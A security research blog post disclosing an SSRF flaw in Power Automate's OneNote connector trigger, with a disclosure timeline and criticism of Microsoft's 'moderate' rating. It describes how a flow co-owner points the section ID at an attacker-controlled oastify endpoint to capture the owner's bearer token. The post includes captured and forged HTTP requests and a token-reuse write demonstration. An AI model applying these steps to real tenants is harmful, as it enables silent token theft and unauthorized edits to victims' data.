---
date: '2025-07-21'
description: A recent vulnerability in Microsoft's Power Automate's OneNote connector
  demonstrates a Server-Side Request Forgery (SSRF) flaw due to insufficient input
  validation. Attackers can exploit this vulnerability to retrieve bearer tokens from
  the flow owner, enabling unauthorized read/write API actions without detection.
  The exploit leverages Microsoft API Hub, which processes requests on behalf of the
  user, bypassing traditional logging mechanisms and maintaining the attack’s stealth.
  Despite the severity of the token leakage, Microsoft classified the issue as "moderate,"
  highlighting ongoing risks in low-friction cloud service integrations. This underscores
  the necessity for robust input validation in API connectors.
link: https://labs.zenity.io/p/i-just-wanted-to-take-a-note-and-your-token-came-along-c615
tags:
- Security Vulnerability
- Power Automate
- SSRF
- Microsoft API Hub
- Token Leak
title: I Just Wanted to Take a Note — and Your Token Came Along
---

0

0

- [Zenity Labs](https://labs.zenity.io/)
- Posts
- I Just Wanted to Take a Note — and Your Token Came Along

# I Just Wanted to Take a Note — and Your Token Came Along

![Author](https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/user/profile_picture/90cb449b-6a9d-4559-8f8b-a131cf119e0c/thumb_0M4A7068.JPG)

[Dmitry Lozovoy](https://labs.zenity.io/authors/90cb449b-6a9d-4559-8f8b-a131cf119e0c)

July 03, 2025

OneNote SSRF in Power Automate – Token Leak Demo - YouTube

[Photo image of d1voy](https://www.youtube.com/channel/UCApPMz3G0iHhkBC_Dq0TJ0A?embeds_referring_euri=https%3A%2F%2Flabs.zenity.io%2F)

d1voy

No subscribers

[OneNote SSRF in Power Automate – Token Leak Demo](https://www.youtube.com/watch?v=KdxS51yaf0s)

d1voy

Search

Info

Shopping

Tap to unmute

If playback doesn't begin shortly, try restarting your device.

You're signed out

Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.

CancelConfirm

Share

Include playlist

An error occurred while retrieving sharing information. Please try again later.

Watch later

Share

Copy link

Watch on

0:00

0:00 / 1:19
•Live

•

[Watch on YouTube](https://www.youtube.com/watch?v=KdxS51yaf0s "Watch on YouTube")

## Introduction

At first, I considered keeping this short, maybe just a quick LinkedIn post to highlight yet another case of **missing input validation** in Power Platform. It’s a recurring issue, and unfortunately, not the last.

But that plan quickly changed.

Just like the last one, the SSRF vulnerability I found isn’t buried deep in some obscure configuration, it’s sitting right in the open. And once again, it affects a very commonly used Power Automate connector: OneNote. Specifically, its trigger.

The exploitation leads to token leakage and allows an attacker to perform both reading and writing API calls, on behalf of the flow owner. And all that happens entirely outside the Power Platform scope.

I won’t go deep into exploitation techniques again, as that has already been (mostly) covered in my previous [blog post](https://labs.zenity.io/p/the-power-of-one-ssrf-vulnerability-a-multi-platform-threat). If you're new here, give that a read first.

For now, let’s just quickly go over the problem - just to remind ourselves how bad it actually is.

## PoC

It all starts innocently enough.

Our user, let’s call them the victim, creates a new Power Automate flow using the OneNote connector. They pick the trigger: _“When a new page is created in a section.”_

They select a notebook and a section, just like they’ve done many times before.

Note: This is literally the simplest possible configuration, and yes, it's just for demo purposes. In real-world scenarios, it can be way more complex, but the vulnerability is hidden in plain sight.

![](https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/dbe6504b-5af9-4326-a25a-fcf55f734ea5/image.png?t=1746704669)

At some point, they share the flow with teammates, giving co-owner permissions. From their perspective, the job is done.

Now let’s switch to the attacker’s perspective, a co-owner who now has access to the flow.

The attacker opens the flow in the editor and navigates to the **Notebook section** field inside the OneNote trigger. Instead of selecting a valid section, he (or she) scrolls down and chooses: _“Enter custom value”._

![](https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/849902f1-eb3d-42e8-95c7-3c6a82d6c0cb/image.png?t=1748962854)

And this is where it all goes south.

The Notebooksection field doesn’t validate its input. The attacker simply replaces the section URL with one they control, maybe their own proxy or a Burp Collaborator endpoint.

![](https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/e8a35bdf-36a0-4c48-aa0f-d4f87454aa69/Screenshot_2025-05-08_at_2.57.04_PM.png?t=1748963087)

And Power Automate?

It just accepts it.

As a result an attacker immediately receives a hit on their server. Why? Because Power Automate tries to validate the custom URL dynamically - and does so, lo and behold, with none other than the **_flow owner’s_** token.

The attacker doesn’t even need to run the flow, nor to supply their own connection (only one connection was bound to the flow - the owner’s). And to top all that: this validation attempt doesn’t leave any trace in the flow run history.

Let’s look at what Power Platform sent out in its validation attempt, which ended up in the attacker’s server:

![](https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/2d71bebb-8a31-4a2e-8a54-bb3aa2f9f99a/Screenshot_2025-06-08_at_3.03.28_PM.png?t=1751562102)

Wait. What’s that in line 21? Is that a token? You bet your life it is.

This token , which originates in the OneNote API, can actually be used outside the Power Platform ecosystem, for example via **cURL** or **Postman**. For the purpose of testing, I used the exfiltrated token to send a PATCH request directly to the OneNote API, modifying the victim’s section title to “d1voy”:

![](https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/512b855f-ce54-4206-82bc-a60d0c2ed7cd/image.png?t=1749639524)

Since the request is made using a valid Microsoft-issued token, Azure AD logs show it as a normal authenticated API call. There’s no way to distinguish between legitimate flow activity and a malicious request from an attacker, making this abuse nearly impossible to detect.

Since the flow wasn’t really executed, no run logs exist. There’s no audit trail pointing to this token exfiltration. The attacker gets what they came for, and the victim remains completely unaware. Provided, of course, the attacker restores the original value.

Remember: the flow only had a OneNote trigger, no write actions. Yet the stolen token allowed me to perform write operations far beyond the flow’s intended behavior.

This is a clear violation of data integrity, where the attacker gains the ability to alter user-owned content that the flow was never intended to touch, and effectively escalates their privileges from co-owner of a read-only trigger to full write access over the victim’s data.

## **How (and WHY) is this even possible?**

I wanted to understand what exactly is causing the problem.

At this point, we know that the attacker:

- Didn’t run the flow.

- Didn’t need their own connection.

- Didn’t trigger anything that would appear in logs.


So… who actually sent that request?

Up to this point, we used the Power Automate UI to demonstrate the SSRF exploitation, just entering a Burp endpoint into the OneNote trigger field. But now, we want to take a closer look: what part of the request actually causes this to happen, and can we trigger it programmatically?

Let’s talk about the real player behind the scenes here: **Microsoft API Hub**.

When you use a connector like **OneNote** in Power Automate, the request doesn’t come from your browser or device. Instead, Microsoft offloads the actual API call to **API Hub** \- a backend service that acts as a centralized proxy for executing flow steps, managing tokens, and bridging Power Platform connectors to their underlying APIs.

If you’d like to try this for yourself, Zenity’s offensive toolset, [PowerPWN](https://github.com/mbrg/power-pwn?utm_source=labs.zenity.io&utm_medium=referral&utm_campaign=i-just-wanted-to-take-a-note-and-your-token-came-along), programmatically interacts with API Hub to detect excessive permission sharing and uncover a wide range of misconfigurations across the Power Platform ecosystem.

You can usually see the API Hub at work when running a flow that contacts external APIs and it’s also used silently by many built-in Microsoft connectors.

API Hub lives at domains like:

```
*.azure-apihub.net
```

And in our case, it left behind a very clear trace in the request that was captured:

```
X-MS-APIM-Referrer: https://default-<guid>.azure-apihub.net/apim/onenote/shared-onenote-.../pages?sectionId=https://<my-oast-url>
```

It originated inside Microsoft’s infrastructure, was routed through API Hub, and ended up at an external domain - the attacker’s… And it brought credentials (a token) with it.

But let’s not stop there.

Let’s look at the full request that hit our server:

```
GET /?sectionId=https%3A%2F%2Fxmnhit9ckj6kbosiyo9yxqc9q0wrki87.oastify.com&filter=createdTime%20gt%202025-05-11T05:48:05.619Z&top=1&orderby=createdTime%20desc HTTP/1.1
x-ms-trigger-callback-url: https://prod-26.westeurope.logic.azure.com/workflows/<...SNIP...>/triggers/When_a_new_page_is_created_in_a_section/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2FWhen_a_new_page_is_created_in_a_section%2Frun%2C%2Ftriggers%2FWhen_a_new_page_is_created_in_a_section%2Fread&sv=1.0&sig=<...SNIP...>
X-MS-APIM-Referrer-Prefix: https://default-<...SNIP...>.05.common.europe002.azure-apihub.net/apim/onenote/shared-onenote-<...SNIP...>
x-ms-workflow-id: <...SNIP...>
x-ms-workflow-version: <...SNIP...>
x-ms-workflow-name: <...SNIP...>
x-ms-workflow-system-id: <...SNIP...>
x-ms-workflow-run-id: <...SNIP...>
x-ms-workflow-operation-name: When_a_new_page_is_created_in_a_section
x-ms-execution-location: westeurope
x-ms-gateway-object-id:
MS-Int-AppId: Microsoft API Hubs
x-ms-tracking-id: <...SNIP...>
x-ms-correlation-id: <...SNIP...>
x-ms-client-request-id: <...SNIP...>
x-ms-activity-vector: 00.01.IN.3Z.IN.05.IN.1T
Accept-Encoding: gzip,deflate
Accept-Language: en-US
X-MS-APIM-Referrer: https://default-<guid>.05.common.europe002.azure-apihub.net/apim/onenote/shared-onenote-.../trigger3/sections/Dynamic/pages?notebookKey=<...SNIP...>&sectionId=https:%252f%252fxmnhit9ckj6kbosiyo9yxqc9q0wrki87.oastify.com
User-Agent: azure-logic-apps/1.0 (workflow 7dff70150ca1411298585671e72fb203; version 08584545780017174050) microsoft-flow/1.0
Authorization: Bearer <...SNIP...>
X-MS-APIM-Callback: https://europe-002.consent.azure-apim.net
X-Forwarded-For: 20.238.230.87
Host: xmnhit9ckj6kbosiyo9yxqc9q0wrki87.oastify.com
Connection: Keep-Alive

```

We already know from the captured request that Microsoft API Hub was the one making the call.

I decided to replay this request programmatically simulate the behavior using my own API Hub token and to confirm that the `sectionId` parameter is vulnerable to the SSRF (and because I am curious).

To simulate the behavior, I forged a request back to API Hub using a fake `sectionId` pointing to `https://ifconfig.me` (just as a controlled example). Here's what it looked like:

```
GET /apim/onenote/shared-onenote-<...SNIP...>/trigger3/sections/Dynamic/pages?notebookKey=<...>&sectionId=https://ifconfig.me HTTP/1.1
Host: europe002.azure-apihub.net
Authorization: Bearer <my_own_token>
...
```

**Tip:** Want your API Hub token? Just run _any_ Power Automate flow that hits an external connector. The bearer token will be visible in the browser's **network tab**, ready to be reused.

The response:

```
HTTP/1.1 200 OK
Via: 1.1 google
Content-Length: 11
Content-Type: text/plain
Access-Control-Allow-Origin: *
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
x-ms-client-region: europe
x-ms-client-session-id: af504f50-2cc9-11f0-b306-61d1396f2911
x-ms-flavor: Production
x-ms-environment-id: default-32f814a9-68c8-4ca1-93aa-5594523476b3
x-ms-tenant-id: 32f814a9-68c8-4ca1-93aa-5594523476b3
x-ms-dlp-re: onenote|False
x-ms-dlp-gu: -|-
x-ms-dlp-ef: -|-/-|-|-
Timing-Allow-Origin: *
x-ms-apihub-cached-response: true
x-ms-apihub-obo: false
Access-Control-Expose-Headers: Alt-Svc,Content-Length,Date,Via,x-ms-client-region,x-ms-client-session-id,x-ms-flavor,x-ms-connection-gateway-object-id,x-ms-connection-parameter-set-name,x-ms-environment-id,x-ms-tenant-id,x-ms-dlp-re,x-ms-dlp-gu,x-ms-dlp-ef,Timing-Allow-Origin,x-ms-apihub-cached-response,x-ms-apihub-obo
Date: Sun, 18 May 2025 13:51:43 GMT

20.86.93.35
```

So what’s interesting here?

The request successfully resolves and returns content from an external domain (in this case, the IP address of the origin server, which belongs to Microsoft).

And yes, the authorization token tied to the request is included in the response. If you swap `ifconfig.me` with your own proxy server, you'll see the actual token leak right into your Burp logs, confirming that the vulnerability is triggered by the `sectionId` parameter.

The fact that it works like this — just feels… wrong.

## Disclosure Timeline

We sent the report to Microsoft:

- The report was created and submitted on **25th February 2025**.

- The case for the issue was opened on **26th February 2025**.

  - It remained in the **Review/Repro** stage until **23th April 2025**
- Status was changed to **Complete** (without any fixes) **23th April 2025**



The MSRC response:





![](https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/6fdd52ab-d54d-4825-9d67-50bfa3bbfba3/image.png?t=1747581354)


_Insert long sigh here._

To be honest, I wasn’t even sure how to react to their response.

So instead of replying out of frustration, I decided to write this blog post.

Well, at least now we know how things stand:

_Despite a full token leak and a completely silent SSRF,_

_it’s “not critical” - just_ **_moderate_** _. Apparently, exfiltrating tokens using_ **_Microsoft’s own cloud infrastructure_** _isn’t urgent. It just quietly lands in their backlog._

Cool.

Stay tuned for more.

#### Reply

Most popular

Add your comment

Login

LoginorSubscribeto participate.

Twitter Widget Iframe
